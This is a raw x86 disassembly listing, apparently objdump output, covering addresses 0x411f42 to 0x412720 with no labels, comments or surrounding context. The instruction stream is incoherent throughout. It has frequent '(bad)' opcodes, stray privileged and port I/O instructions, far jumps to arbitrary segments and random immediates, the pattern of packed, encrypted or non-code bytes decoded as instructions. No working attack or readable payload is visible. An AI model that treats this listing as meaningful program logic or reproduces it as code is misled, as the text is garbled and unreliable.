  411f42:	(bad)
  411f45:	mov    eax,ds:0x719b7f1
  411f4a:	js     0x411f92
  411f4c:	pop    ecx
  411f4d:	push   ebx
  411f4e:	xchg   esp,eax
  411f4f:	push   edi
  411f50:	dec    eax
  411f51:	mov    ds:0x48a02ca8,eax
  411f56:	push   ss
  411f57:	mov    edx,0x9a25cfc1
  411f5c:	or     ch,0x7f
  411f5f:	mov    eax,0xea0e699f
  411f64:	mov    al,ds:0x8d38865e
  411f69:	fdivr  QWORD PTR [ebx-0x5bebee5d]
  411f6f:	leave  
  411f70:	retf   
  411f71:	push   ebp
  411f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f73:	cwde   
  411f74:	push   ebx
  411f75:	add    eax,0x93bd679
  411f7a:	ja     0x411f15
  411f7c:	xor    BYTE PTR [ebx+0x14],dh
  411f7f:	icebp  
  411f80:	int3   
  411f81:	out    0x45,al
  411f83:	int3   
  411f84:	pop    edi
  411f85:	mov    ah,0x7c
  411f87:	pop    ecx
  411f88:	stos   DWORD PTR es:[edi],eax
  411f89:	jmp    0x411fcd
  411f8b:	push   cs
  411f8c:	jnp    0x411f5e
  411f8e:	jp     0x411f70
  411f90:	adc    dh,bh
  411f92:	(bad)  
  411f94:	cli    
  411f95:	scas   eax,DWORD PTR es:[edi]
  411f96:	and    eax,0xa37bc816
  411f9b:	mov    bh,0xdb
  411f9d:	push   es
  411f9e:	ror    esp,cl
  411fa0:	sbb    ecx,DWORD PTR [eax+0x10]
  411fa3:	ret    0xcfd9
  411fa6:	sub    al,0xa6
  411fa8:	(bad)  
  411fa9:	xchg   esp,eax
  411faa:	mov    esi,0x112a8a2a
  411faf:	sub    ecx,eax
  411fb1:	or     eax,esi
  411fb3:	adc    esp,DWORD PTR cs:[eax-0x7ceaa6fd]
  411fba:	dec    eax
  411fbb:	test   BYTE PTR fs:[eax-0x62],dh
  411fbf:	jp     0x411fb5
  411fc1:	jl     0x411ff2
  411fc3:	(bad)  
  411fc4:	cmp    al,0x2a
  411fc6:	sub    al,BYTE PTR [ebp-0x66664010]
  411fcc:	(bad)  
  411fcd:	out    dx,al
  411fce:	mov    ebp,DWORD PTR [ecx]
  411fd0:	ror    eax,cl
  411fd2:	scas   al,BYTE PTR es:[edi]
  411fd3:	es cmp eax,0x50e8e794
  411fd9:	and    BYTE PTR [edi+0x3a58a81f],ah
  411fdf:	outs   dx,DWORD PTR ds:[esi]
  411fe0:	cmp    DWORD PTR [esi+0x113c94ce],0xcdd48f1d
  411fea:	jle    0x411fb2
  411fec:	(bad)
  411ff1:	add    BYTE PTR fs:[ecx+0x73],dl
  411ff5:	and    al,0x34
  411ff7:	mov    esi,DWORD PTR [ecx+0x5068784b]
  411ffd:	mov    ch,0x77
  411fff:	mov    ah,0x2a
  412001:	imul   eax,DWORD PTR ds:0xb03c39d9,0x71deb28f
  41200b:	adc    DWORD PTR [ebx],ecx
  41200d:	or     DWORD PTR [eax-0x1c79d065],0x61cae63a
  412017:	into   
  412018:	retf   0x9cb4
  41201b:	push   edi
  41201c:	jp     0x412008
  41201e:	push   es
  41201f:	and    ecx,0x460ba9e
  412025:	fist   WORD PTR [edi]
  412027:	mov    edx,0xb23676f0
  41202c:	adc    DWORD PTR [esi+0x2e09271d],edi
  412032:	adc    esp,esp
  412034:	int    0x2c
  412036:	xchg   ebx,eax
  412037:	sahf   
  412038:	in     eax,dx
  412039:	add    ecx,DWORD PTR [ecx+0x36]
  41203c:	test   dl,dl
  41203e:	add    eax,0xe0bd130
  412043:	inc    esp
  412044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412045:	fscale 
  412047:	stos   BYTE PTR es:[edi],al
  412048:	mov    bl,0xdd
  41204a:	jl     0x41205d
  41204c:	stos   DWORD PTR es:[edi],eax
  41204d:	push   0x162acaff
  412052:	mov    BYTE PTR [esi],dh
  412054:	mov    DWORD PTR [ebp+0x28],esp
  412057:	adc    dl,0x42
  41205a:	addr16 and al,0x99
  41205d:	xchg   esi,eax
  41205e:	imul   edx,DWORD PTR [edi-0x58],0x6292c628
  412065:	scas   al,BYTE PTR es:[edi]
  412066:	or     al,BYTE PTR [edi]
  412068:	fimul  WORD PTR [edi+0x16]
  41206b:	sbb    dl,al
  41206d:	push   eax
  41206e:	pop    esp
  41206f:	stc    
  412070:	mov    ebp,0x324f7333
  412075:	mov    bl,0x0
  412077:	dec    eax
  412078:	jb     0x4120ac
  41207a:	(bad)  
  41207b:	jecxz  0x41206e
  41207d:	cmp    DWORD PTR [esi],eax
  41207f:	push   cs
  412080:	mov    ecx,0x4d224c64
  412085:	ja     0x4120f6
  412087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412088:	xchg   esi,eax
  412089:	pop    esp
  41208a:	(bad)  
  41208b:	neg    BYTE PTR [esi+0x3dc9f00c]
  412091:	mov    eax,0x86b226f0
  412096:	ss jnp 0x412052
  412099:	mov    esp,0x8631696d
  41209e:	pushf  
  41209f:	leave  
  4120a0:	pop    ds
  4120a1:	mov    ch,0xff
  4120a3:	cld    
  4120a4:	sub    BYTE PTR ds:0x6e0fe43a,cl
  4120aa:	pop    es
  4120ab:	mov    edx,DWORD PTR [ecx]
  4120ad:	lds    ebx,FWORD PTR [edx+esi*8-0x42]
  4120b1:	inc    ecx
  4120b2:	fs pop ds
  4120b4:	(bad)  
  4120b5:	or     esi,DWORD PTR [ebx-0x5f2bd33f]
  4120bb:	je     0x41205a
  4120bd:	pop    edx
  4120be:	dec    esi
  4120bf:	add    DWORD PTR [esi+0x3c65b2f1],0x26
  4120c6:	pop    edx
  4120c7:	push   0x655f0ff6
  4120cc:	pop    esi
  4120cd:	enter  0x1723,0x5c
  4120d1:	pop    ecx
  4120d2:	mov    eax,ds:0x468c0cdb
  4120d7:	stos   BYTE PTR es:[edi],al
  4120d8:	fild   DWORD PTR [bx+di-0x682b]
  4120dd:	cld    
  4120de:	jp     0x41213a
  4120e0:	arpl   WORD PTR [ebp+edi*2-0x3d],cx
  4120e4:	push   ebx
  4120e5:	pop    DWORD PTR [ebx]
  4120e7:	sbb    ah,BYTE PTR [edi-0x39]
  4120ea:	stos   BYTE PTR es:[edi],al
  4120eb:	pop    es
  4120ec:	test   ebx,ebp
  4120ee:	loopne 0x4120b8
  4120f0:	sub    BYTE PTR [esp+esi*1+0x50f2cf9a],al
  4120f7:	out    dx,eax
  4120f8:	jecxz  0x412112
  4120fa:	mov    edx,0x8d14a50b
  4120ff:	iret   
  412100:	push   ebp
  412101:	push   0x42
  412103:	mov    al,ds:0x74afd48c
  412108:	mov    eax,ds:0x83e5a7fe
  41210d:	rcl    DWORD PTR [eax],1
  41210f:	fcmovu st,st(6)
  412111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412112:	pusha  
  412113:	jb     0x4120fc
  412115:	js     0x4120bf
  412117:	test   BYTE PTR [esi+ebp*8],ch
  41211a:	jae    0x412176
  41211c:	fistp  WORD PTR [ecx]
  41211e:	gs ins DWORD PTR es:[edi],dx
  412120:	mov    dh,cl
  412122:	std    
  412123:	mov    edx,0x5dcbec9c
  412128:	hlt    
  412129:	aam    0x91
  41212b:	mov    bl,0x87
  41212d:	fwait
  41212e:	xchg   edx,eax
  41212f:	lods   eax,DWORD PTR ds:[esi]
  412130:	js     0x4120c9
  412132:	mov    dh,0x4f
  412134:	push   esi
  412135:	test   BYTE PTR [eax],bh
  412137:	rcl    BYTE PTR [ebx-0x13e90f7f],0xb8
  41213e:	popa   
  41213f:	pop    ebp
  412140:	mov    eax,ds:0xa1c7f997
  412145:	dec    ebp
  412146:	sub    edi,esp
  412148:	pop    ebx
  412149:	xor    ebp,DWORD PTR [edx-0x200dbca4]
  41214f:	cwde   
  412150:	aaa    
  412151:	xor    ecx,DWORD PTR [edx-0x5a]
  412154:	clc    
  412155:	push   ebp
  412156:	bound  edx,QWORD PTR [edi-0x63]
  412159:	xlat   BYTE PTR ds:[ebx]
  41215a:	leave  
  41215b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41215c:	repz fcom DWORD PTR [eax]
  41215f:	mov    ds:0x28ac5deb,al
  412164:	and    eax,DWORD PTR [eax]
  412166:	fdivr  DWORD PTR [ebx]
  412168:	scas   eax,DWORD PTR es:[edi]
  412169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41216a:	mov    DWORD PTR [ecx+0x6f],edi
  41216d:	nop
  41216e:	and    eax,0x60718dfd
  412173:	mov    ah,0xd7
  412175:	shr    DWORD PTR [edi-0x6d6bdb09],1
  41217b:	jecxz  0x412106
  41217d:	aas    
  41217e:	push   ecx
  41217f:	jecxz  0x412142
  412181:	test   al,0x9d
  412183:	sbb    BYTE PTR [ebx-0x3de815b5],ah
  412189:	cld    
  41218a:	push   ss
  41218b:	cmp    al,0xbd
  41218d:	mov    esp,0xea54a9d0
  412192:	mov    bl,0xa0
  412194:	jecxz  0x41211a
  412196:	add    al,BYTE PTR [ecx-0x60]
  412199:	sub    eax,0x3b0ea511
  41219e:	sbb    eax,0x773865a7
  4121a3:	pop    ebp
  4121a4:	nop    ebx
  4121a7:	ror    BYTE PTR [ecx+edi*1+0x6813215],0x9a
  4121af:	imul   DWORD PTR [ecx]
  4121b1:	(bad)  
  4121b2:	add    eax,0xacc6561d
  4121b7:	fiadd  DWORD PTR [eax+esi*1-0x62]
  4121bb:	mov    ebp,0xca516f48
  4121c1:	(bad)  
  4121c2:	shl    al,0x9f
  4121c5:	inc    eax
  4121c7:	shl    edi,cl
  4121c9:	lods   eax,DWORD PTR ds:[esi]
  4121ca:	test   DWORD PTR [edx+edx*1-0x7e],esp
  4121ce:	lahf   
  4121cf:	stos   BYTE PTR es:[edi],al
  4121d0:	loop   0x41222f
  4121d2:	sbb    esp,DWORD PTR [edi+0x2d7c36bb]
  4121d8:	cmp    BYTE PTR ds:0x7569c137,0xb2
  4121df:	mov    dh,0xc9
  4121e1:	test   BYTE PTR [ecx],ch
  4121e3:	dec    edx
  4121e4:	push   ebx
  4121e5:	iret   
  4121e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e7:	lea    edi,[edx]
  4121e9:	pop    edi
  4121ea:	fwait
  4121eb:	pop    edi
  4121ec:	jns    0x412224
  4121ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ef:	or     edx,DWORD PTR [eax+eiz*4]
  4121f2:	in     al,dx
  4121f3:	jge    0x412248
  4121f5:	sbb    BYTE PTR [ecx-0x5ef68881],ah
  4121fb:	inc    edx
  4121fc:	lahf   
  4121fd:	sbb    BYTE PTR [ecx-0x22c27010],dl
  412203:	cdq    
  412204:	mov    edi,0xc405949a
  412209:	pop    ebp
  41220a:	jg     0x412240
  41220c:	sub    ecx,ebx
  41220e:	popf   
  41220f:	cmp    DWORD PTR [ebp-0x65],ecx
  412212:	retf   0x384e
  412215:	pop    ebx
  412216:	neg    DWORD PTR [edx]
  412218:	stc    
  412219:	cmp    DWORD PTR ds:0x19f7c24a,ebp
  41221f:	mov    eax,0x37d9c305
  412224:	sub    ah,bh
  412226:	mov    dl,0xb9
  412228:	arpl   di,cx
  41222a:	mov    DWORD PTR [edi-0x19],ebx
  41222d:	fadd   DWORD PTR [ebx+0x664cee63]
  412233:	jmp    0x1ce:0x5a6097ed
  41223a:	repnz std 
  41223c:	nop
  41223d:	test   DWORD PTR [edx+0x176f1f78],esp
  412243:	enter  0x8718,0xd3
  412247:	mov    ds:0x78e741e1,eax
  41224c:	xchg   BYTE PTR [eax+0x3d],ch
  41224f:	jo     0x4121f9
  412251:	mov    dh,0x69
  412253:	mov    esi,0xdbe823b6
  412258:	mov    eax,0x7cdee450
  41225d:	pop    ds
  41225e:	int    0x4a
  412260:	jp     0x412207
  412262:	call   eax
  412264:	retf   
  412265:	bnd jnp 0x41220f
  412268:	shl    DWORD PTR [ecx+0x15],0xc3
  41226c:	cmp    edi,0xffffffe6
  41226f:	inc    ecx
  412270:	popa   
  412271:	call   0x5a46:0xcc055529
  412278:	jmp    0xc55d:0x2adedad3
  41227f:	mov    DWORD PTR [edi+0x73c812e6],ebp
  412285:	or     eax,0x77ad08aa
  41228a:	ret    
  41228b:	sbb    DWORD PTR [esi-0x5a],ebx
  41228e:	push   ebp
  41228f:	fmul   DWORD PTR [ebp-0x2b]
  412292:	test   DWORD PTR ds:0x14ae5582,edx
  412298:	or     eax,DWORD PTR [esi-0x67]
  41229b:	mov    bl,BYTE PTR [ecx-0x239844be]
  4122a1:	hlt    
  4122a2:	pop    bx
  4122a4:	mov    ebx,0xd3dddf36
  4122a9:	push   ebx
  4122aa:	mov    ebx,0xd31405a1
  4122af:	push   esi
  4122b0:	push   ebp
  4122b1:	sbb    al,0xc4
  4122b3:	mov    dh,0xa6
  4122b5:	jno    0x4122e7
  4122b7:	in     eax,dx
  4122b8:	sub    ecx,0x408e9f62
  4122be:	add    eax,0xc859bc5
  4122c3:	shl    ch,1
  4122c5:	loopne 0x4122a8
  4122c7:	xor    dl,ch
  4122c9:	pop    ss
  4122ca:	cmp    eax,0x4f07bafc
  4122cf:	daa    
  4122d0:	xor    DWORD PTR [ebp+0x603314b0],esp
  4122d6:	imul   eax,DWORD PTR [ebx+ecx*8],0x1c
  4122da:	adc    ecx,esi
  4122dc:	sub    bh,BYTE PTR [eax+edi*4]
  4122df:	push   ecx
  4122e0:	(bad)  
  4122e3:	outs   dx,BYTE PTR ds:[esi]
  4122e4:	cwde   
  4122e5:	mov    eax,0x97887023
  4122ea:	rol    BYTE PTR [esi+ebp*8-0x76],cl
  4122ee:	xor    al,0xbc
  4122f0:	ss xchg esi,eax
  4122f2:	xor    dl,bl
  4122f4:	sub    ebp,edi
  4122f6:	shl    BYTE PTR es:[edx+0x914c838],0xb3
  4122fe:	xor    DWORD PTR [ebp+0x7d],0x23
  412302:	adc    DWORD PTR [edi-0x3c4ef3c6],0x6499dc5
  41230c:	jnp    0x4122a7
  41230e:	xor    BYTE PTR [ecx-0x8],dl
  412311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412312:	in     al,dx
  412313:	loopne 0x4122ff
  412315:	in     al,0x38
  412317:	ficomp DWORD PTR [ecx]
  412319:	push   ecx
  41231a:	push   ebp
  41231b:	cdq    
  41231c:	imul   edi,DWORD PTR [ebx-0x652f4ca0],0x6d
  412323:	adc    al,0x11
  412325:	mov    ecx,0x27eedf2c
  41232a:	sbb    al,0x8f
  41232c:	je     0x4122d4
  41232e:	lds    edx,FWORD PTR [edx]
  412330:	scas   eax,DWORD PTR es:[edi]
  412331:	inc    esi
  412332:	adc    eax,0x78f9b7f0
  412337:	add    al,0x74
  412339:	and    ch,dh
  41233b:	push   0x7ac1799
  412340:	arpl   WORD PTR [ebx+0xf],dx
  412343:	shl    BYTE PTR [edi],1
  412345:	dec    ecx
  412346:	pop    ebx
  412347:	add    al,ah
  412349:	int    0xce
  41234b:	cmp    DWORD PTR [ecx+0xe],edi
  41234e:	and    eax,0xd0cb582f
  412353:	mov    eax,DWORD PTR [edx]
  412355:	leave  
  412356:	cdq    
  412357:	sub    eax,0x2859d86a
  41235c:	dec    bl
  41235e:	ror    cl,1
  412360:	mov    ecx,0xb5a161d1
  412365:	test   DWORD PTR [edx-0x573d23fd],ebx
  41236b:	mov    edx,0xd6e822ca
  412370:	nop
  412371:	xor    al,0xd5
  412373:	jne    0x4123ed
  412375:	jmp    0x6e01:0xb1a04aea
  41237c:	int3   
  41237d:	pop    ss
  41237e:	outs   dx,DWORD PTR ds:[esi]
  41237f:	in     eax,0x9c
  412381:	xor    dl,bl
  412383:	mov    WORD PTR [ecx],ds
  412385:	xchg   edx,eax
  412386:	add    BYTE PTR [edx-0x6b54c8c4],dh
  41238c:	or     DWORD PTR [eax-0x35bec09e],ebp
  412392:	retf   
  412393:	and    BYTE PTR [edi-0x2e734ee8],cl
  412399:	(bad)  
  41239a:	fmul   QWORD PTR [ebx+edx*1-0x7935389d]
  4123a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a2:	mov    ds,WORD PTR [eax-0x325918a6]
  4123a8:	push   ss
  4123a9:	arpl   bp,cx
  4123ab:	xor    BYTE PTR [edx+0x59],al
  4123ae:	add    dh,dl
  4123b0:	imul   ecx,ecx,0xffffffec
  4123b3:	inc    esi
  4123b4:	nop
  4123b5:	fnstcw WORD PTR [eax]
  4123b7:	jp     0x4123d2
  4123b9:	cwde   
  4123ba:	pop    esi
  4123bb:	pop    ss
  4123bc:	xchg   esi,eax
  4123bd:	mov    ah,0x41
  4123bf:	mov    dh,0xfa
  4123c1:	xchg   ebx,eax
  4123c2:	and    DWORD PTR [eax-0x1331c464],esi
  4123c8:	inc    ecx
  4123c9:	cs adc al,0x44
  4123cc:	out    0x21,eax
  4123ce:	clc    
  4123cf:	mov    fs,WORD PTR [ebx+0x75]
  4123d2:	jecxz  0x4123d4
  4123d4:	ins    DWORD PTR es:[edi],dx
  4123d5:	and    eax,0x5576cc82
  4123da:	mov    ch,0xbe
  4123dc:	ja     0x412436
  4123de:	pop    eax
  4123df:	in     eax,0xa5
  4123e1:	cmc    
  4123e2:	push   ebp
  4123e3:	jns    0x412369
  4123e5:	daa    
  4123e6:	lods   al,BYTE PTR ds:[esi]
  4123e7:	mov    esp,0x2b63f677
  4123ec:	repz fld TBYTE PTR [ebx+0x76]
  4123f0:	sahf   
  4123f1:	enter  0xd82f,0x4
  4123f5:	mov    eax,ds:0x78519325
  4123fa:	sbb    BYTE PTR [esi],ah
  4123fc:	hlt    
  4123fd:	cld    
  4123fe:	je     0x412399
  412400:	lods   eax,DWORD PTR ds:[esi]
  412401:	aam    0x0
  412403:	mov    dl,0x3b
  412405:	cdq    
  412406:	dec    ebp
  412407:	mov    edi,0x82e982df
  41240c:	pop    ebp
  41240d:	and    eax,DWORD PTR [ebx+ebp*4+0x40]
  412411:	lods   al,BYTE PTR ds:[esi]
  412412:	mov    ebp,0x727f8649
  412417:	inc    edi
  412418:	fld    TBYTE PTR [ebx]
  41241a:	xor    edi,DWORD PTR [ebx]
  41241c:	or     esi,esi
  41241e:	mov    ecx,0x1629447e
  412423:	call   0xe2a1:0xf986c2ce
  41242a:	add    esp,DWORD PTR [edi]
  41242c:	xchg   ebx,eax
  41242d:	adc    esi,ebx
  41242f:	sub    edx,DWORD PTR [eax+0x2a]
  412432:	es js  0x412410
  412435:	loopne 0x412427
  412437:	repz cwde 
  412439:	sbb    DWORD PTR [edi-0x5a],esp
  41243c:	inc    ebp
  41243d:	imul   DWORD PTR [esi+0x62]
  412440:	loope  0x412498
  412442:	jne    0x412420
  412444:	push   esi
  412445:	arpl   WORD PTR [esi+0x2c],si
  412448:	fimul  DWORD PTR [edx+0x25]
  41244b:	mov    al,0xb7
  41244d:	sbb    DWORD PTR [edi-0x21],edi
  412450:	jl     0x4123fd
  412452:	add    BYTE PTR [edx],dl
  412454:	pop    ebx
  412455:	or     esi,DWORD PTR fs:[ecx+0x38]
  412459:	aam    0x44
  41245b:	(bad)  
  41245c:	xchg   esi,eax
  41245d:	loope  0x4124ba
  41245f:	add    BYTE PTR [ecx+0x50],dl
  412462:	push   edx
  412463:	pop    esi
  412464:	jp     0x4123e9
  412466:	mov    cl,0xe2
  412468:	jne    0x412400
  41246a:	mov    BYTE PTR [ebx],bl
  41246c:	pop    eax
  41246d:	and    DWORD PTR [esp+ebp*2+0x75],ebx
  412471:	ja     0x4124e5
  412473:	push   edi
  412474:	jge    0x4124a3
  412476:	or     BYTE PTR [ebx+0x25],0x78
  41247a:	lods   eax,DWORD PTR ds:[esi]
  41247b:	iretw  
  41247d:	inc    ebx
  41247e:	mov    ds:0x488beb43,eax
  412483:	int3   
  412484:	das    
  412485:	jp     0x412444
  412487:	inc    dx
  412489:	xchg   edx,eax
  41248a:	adc    eax,0xdd80ecf5
  41248f:	inc    eax
  412490:	sbb    BYTE PTR [ebp+0x66de9157],ch
  412496:	addr16 fcmovbe st,st(1)
  412499:	retf   0xfdd7
  41249c:	add    ebx,ecx
  41249e:	jecxz  0x412487
  4124a0:	xor    al,0x97
  4124a2:	push   ebp
  4124a3:	cmp    DWORD PTR ds:0x715be7e3,esi
  4124a9:	cmp    BYTE PTR [ebp+0x25b337e5],0xd4
  4124b0:	sbb    al,BYTE PTR [edx+0x6aac3a3a]
  4124b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b7:	sbb    BYTE PTR [ebx+0x15fc7725],dh
  4124bd:	sbb    bh,ch
  4124bf:	mov    eax,0x8b88fa0b
  4124c4:	sbb    dh,BYTE PTR [ecx]
  4124c6:	aad    0x82
  4124c8:	mov    ah,0xd1
  4124ca:	in     al,dx
  4124cb:	cmc    
  4124cc:	push   eax
  4124cd:	std    
  4124ce:	clc    
  4124cf:	mov    DWORD PTR [esp+esi*4+0x70],esi
  4124d3:	xchg   ecx,eax
  4124d4:	enter  0x2a8e,0x70
  4124d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124d9:	lock mov al,0x7e
  4124dc:	jg     0x412531
  4124de:	dec    eax
  4124df:	add    ecx,DWORD PTR [edi+esi*2]
  4124e2:	(bad)  
  4124e3:	xor    al,0x48
  4124e5:	lods   eax,DWORD PTR ds:[esi]
  4124e6:	pop    ss
  4124e7:	and    al,0x95
  4124e9:	mov    al,0x4a
  4124eb:	cmp    DWORD PTR [edi],edi
  4124ed:	hlt    
  4124ee:	cwde   
  4124ef:	xchg   DWORD PTR ds:0x6e8b3491,esp
  4124f5:	cmp    edx,DWORD PTR [esi]
  4124f7:	loopne 0x4124c9
  4124f9:	in     al,dx
  4124fa:	bound  ebp,QWORD PTR [eax]
  4124fc:	cli    
  4124fd:	in     al,0x3
  4124ff:	push   es
  412500:	lods   eax,DWORD PTR ds:[esi]
  412501:	cs pop edx
  412503:	add    esi,0x7fea0020
  412509:	inc    edi
  41250a:	js     0x4124df
  41250c:	enter  0x384,0x19
  412510:	repz fwait
  412512:	enter  0x9bcf,0xac
  412516:	inc    bh
  412518:	shr    DWORD PTR [edi*1+0x17fa16c3],0x2e
  412520:	mov    WORD PTR [ecx+ebx*2-0x3],ss
  412524:	cli    
  412525:	mov    edx,DWORD PTR [eax]
  412527:	test   al,0x5e
  412529:	and    ecx,DWORD PTR [eax]
  41252b:	(bad)  
  41252c:	pushf  
  41252d:	adc    dh,BYTE PTR [edx+0x52]
  412530:	and    BYTE PTR [ecx-0x50],cl
  412533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412536:	inc    edx
  412537:	dec    ecx
  412538:	mov    ah,0x3a
  41253a:	sub    edx,DWORD PTR [edi+0x5ca9f57]
  412540:	xor    dh,bl
  412542:	imul   edi,edx,0x780a6a0d
  412548:	in     al,0x79
  41254a:	add    ch,dl
  41254c:	cld    
  41254d:	jge    0x41250e
  41254f:	imul   edi,DWORD PTR ss:[ecx+0x64],0xf37d6001
  412557:	push   0x3
  412559:	jae    0x4125cf
  41255b:	test   eax,0x7921940f
  412560:	sub    BYTE PTR [eax-0x63d819f1],0x44
  412567:	dec    edx
  412568:	dec    ebx
  412569:	es cld 
  41256b:	(bad)  
  41256c:	pop    ebp
  41256d:	jmp    DWORD PTR ds:0xd00b7486
  412573:	je     0x412550
  412575:	mov    ds:0x21278e87,al
  41257a:	rol    bl,0x2c
  41257d:	or     eax,0x54cc487f
  412582:	push   ds
  412583:	jne    0x412566
  412585:	inc    ebp
  412586:	mov    ds,WORD PTR ds:0x474112d7
  41258c:	mov    cl,0xa9
  41258e:	sbb    ah,BYTE PTR [ebp-0x7e822786]
  412594:	mov    WORD PTR [ebx-0x1f3ff09a],ss
  41259a:	gs mov esp,0xd2d68ddc
  4125a0:	sbb    ah,BYTE PTR ds:0xbac013f6
  4125a6:	adc    cl,BYTE PTR [eax+0x11d003cb]
  4125ac:	adc    DWORD PTR [eax],ebp
  4125ae:	sub    DWORD PTR [edx],ebp
  4125b0:	dec    esi
  4125b1:	sub    BYTE PTR [ebp+eax*2-0xfe59f1e],bh
  4125b8:	sbb    BYTE PTR [edx],0x4b
  4125bb:	ja     0x412597
  4125bd:	pop    ebx
  4125be:	jl     0x4125b9
  4125c0:	xchg   ebp,eax
  4125c1:	jnp    0x4125da
  4125c3:	mov    ebx,0x15c8ae69
  4125c8:	sahf   
  4125c9:	pop    ds
  4125ca:	shl    edi,1
  4125cc:	push   eax
  4125cd:	push   ebx
  4125ce:	and    DWORD PTR [ebp-0x75985f40],edi
  4125d4:	sub    al,0xdc
  4125d6:	nop
  4125d7:	fwait
  4125d8:	sbb    esi,DWORD PTR [eax-0x4e]
  4125db:	xchg   edi,ecx
  4125dd:	fmulp  st(3),st
  4125df:	ins    DWORD PTR es:[edi],dx
  4125e0:	inc    BYTE PTR [eax]
  4125e2:	mov    eax,0x925546da
  4125e7:	(bad)  
  4125e9:	stos   DWORD PTR es:[edi],eax
  4125ea:	loope  0x412630
  4125ec:	jl     0x4125c5
  4125ee:	inc    ebp
  4125ef:	and    dh,cl
  4125f1:	adc    eax,0x2b15bab7
  4125f6:	pop    ss
  4125f7:	xchg   ebp,eax
  4125f8:	adc    dh,BYTE PTR [edi+esi*4-0x699aad9]
  4125ff:	(bad)  
  412600:	push   cs
  412601:	fs cmp al,0x98
  412604:	mov    ch,0xd8
  412606:	mov    al,ds:0x1dfdb778
  41260b:	outs   dx,BYTE PTR ds:[esi]
  41260c:	sub    dh,BYTE PTR [ecx]
  41260e:	(bad)  
  41260f:	repz cmp DWORD PTR [eax],ebp
  412612:	add    edi,eax
  412614:	fbld   TBYTE PTR [ebx]
  412616:	sbb    eax,0x723e7cc3
  41261b:	sbb    cl,0x86
  41261e:	test   ecx,ebp
  412620:	sahf   
  412621:	ja     0x412631
  412623:	ja     0x41262b
  412625:	out    dx,al
  412626:	mov    dl,BYTE PTR [ebx+0x55]
  412629:	mov    edi,0x163c6110
  41262e:	pop    esi
  41262f:	cmp    cl,BYTE PTR [ecx]
  412631:	call   DWORD PTR [eax]
  412633:	jne    0x4125f8
  412635:	popf   
  412636:	sar    DWORD PTR [eax-0x40],1
  412639:	mov    dh,0x13
  41263b:	push   eax
  41263c:	daa    
  41263d:	or     eax,0xb128e5bc
  412642:	(bad)  
  412643:	cli    
  412644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412645:	lods   al,BYTE PTR ds:[esi]
  412646:	add    ecx,edi
  412648:	xchg   ebp,eax
  412649:	mov    bh,0xdf
  41264b:	cmp    DWORD PTR [ecx],esp
  41264d:	mov    al,0x1a
  41264f:	fdiv   DWORD PTR [esi]
  412651:	inc    eax
  412652:	lahf   
  412653:	std    
  412654:	outs   dx,BYTE PTR ds:[esi]
  412655:	les    ebp,FWORD PTR [ecx-0x120eba5a]
  41265b:	and    esp,eax
  41265d:	fxtract 
  41265f:	and    eax,0x9e5e410a
  412664:	add    bl,0x45
  412667:	xor    al,0xda
  412669:	sar    DWORD PTR [ebp+0x60],cl
  41266c:	dec    esp
  41266d:	sub    eax,0xfae4a598
  412672:	push   ds
  412673:	or     al,0xc0
  412675:	xchg   dh,cl
  412677:	inc    eax
  412678:	push   esp
  412679:	(bad)  
  41267a:	mov    edx,0x8be18801
  41267f:	push   cs
  412680:	in     eax,0x63
  412682:	test   BYTE PTR [ebp+0x55175f93],0x32
  412689:	aad    0x90
  41268b:	les    ecx,FWORD PTR [edx-0x71]
  41268e:	dec    ebx
  41268f:	add    BYTE PTR [ebp-0x37],dl
  412692:	mov    BYTE PTR es:[ebx-0x1b],ah
  412696:	add    dl,0x34
  412699:	adc    esp,DWORD PTR [esi]
  41269b:	test   al,0xa4
  41269d:	mov    BYTE PTR [ecx+eax*4],dl
  4126a0:	jmp    0x1e33c8d8
  4126a5:	in     al,0x55
  4126a7:	cli    
  4126a8:	cmp    ah,dh
  4126aa:	xchg   esp,eax
  4126ab:	pop    edi
  4126ac:	in     eax,0xaa
  4126ae:	push   edx
  4126af:	xor    al,0x23
  4126b1:	loopne 0x412645
  4126b3:	sub    ah,BYTE PTR [ecx]
  4126b5:	mov    esp,0xec2e4515
  4126ba:	dec    ebp
  4126bb:	push   edx
  4126bc:	test   dh,al
  4126be:	jmp    0xb05c:0x1515e7ca
  4126c5:	out    0x5a,al
  4126c7:	jno    0x412700
  4126c9:	xchg   BYTE PTR [esi],dl
  4126cb:	sbb    al,0x99
  4126cd:	stos   DWORD PTR es:[edi],eax
  4126ce:	fcomp  QWORD PTR [esi+eax*2]
  4126d1:	lock push edx
  4126d3:	in     al,dx
  4126d4:	pop    eax
  4126d5:	cmp    DWORD PTR [edi+0x44],0x26
  4126d9:	sbb    BYTE PTR [edi-0x5bcf598e],ch
  4126df:	fstp   DWORD PTR [edx+esi*2+0x72087729]
  4126e6:	push   0x37
  4126e8:	ret    
  4126e9:	xchg   BYTE PTR [esi+0x68],ch
  4126ec:	dec    ecx
  4126ed:	jp     0x412731
  4126ef:	xchg   esp,eax
  4126f0:	stc    
  4126f1:	jge    0x4126d5
  4126f3:	mov    esp,ecx
  4126f5:	mov    edx,0xe8fbd2de
  4126fa:	into   
  4126fb:	mov    WORD PTR [edi-0x8a531bd],ss
  412701:	push   ebp
  412702:	int    0xea
  412704:	idiv   BYTE PTR [eiz*1+0x7d6c06af]
  41270b:	stos   BYTE PTR es:[edi],al
  41270c:	add    al,0x5c
  41270e:	jp     0x412715
  412710:	push   0xd1603870
  412715:	jecxz  0x41269a
  412717:	retf   
  412718:	pop    ecx
  412719:	jmp    0x412751
  41271b:	jl     0x412732
  41271d:	(bad)
  412720:	xchg   ecx,eax
